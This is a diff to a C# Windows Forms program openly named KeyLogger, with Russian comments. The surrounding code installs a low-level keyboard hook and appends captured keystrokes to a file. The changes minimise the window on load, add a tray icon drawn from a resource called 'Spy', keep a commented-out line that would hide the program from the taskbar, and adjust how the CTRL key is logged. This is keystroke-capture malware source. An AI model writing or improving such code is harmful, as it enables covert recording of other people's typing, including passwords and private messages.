@@ -1,4 +1,5 @@
-﻿using System;
+﻿using KeyLogger.Properties;
+using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
@@ -14,6 +15,9 @@ namespace KeyLogger
 {
     public partial class MainForm : Form
     {
+        // Иконка.
+        private NotifyIcon notifyIcon = null;
+
         // Делегат.
         private delegate IntPtr LowLevelKeyboardProc(
             int nCode, IntPtr wParam, IntPtr lParam);
@@ -73,7 +77,7 @@ namespace KeyLogger
                 using (StreamWriter sw = new StreamWriter(fileName, append: true))
                 {
                     // Раскладка Великобритании.
-                    if (vkCode.ToString() == "17")
+                     if (vkCode.ToString() == "162")
                     {
                         sw.Write("CTRL");
                     }
@@ -119,6 +123,13 @@ namespace KeyLogger
 
         private void MainForm_Load(object sender, EventArgs e)
         {
+            //this.ShowInTaskbar = false;
+            this.WindowState = FormWindowState.Minimized;
+
+            notifyIcon = new NotifyIcon();
+            notifyIcon.Icon = Resources.Spy;
+            notifyIcon.Visible = true;
+
             SetHook();
         }
 
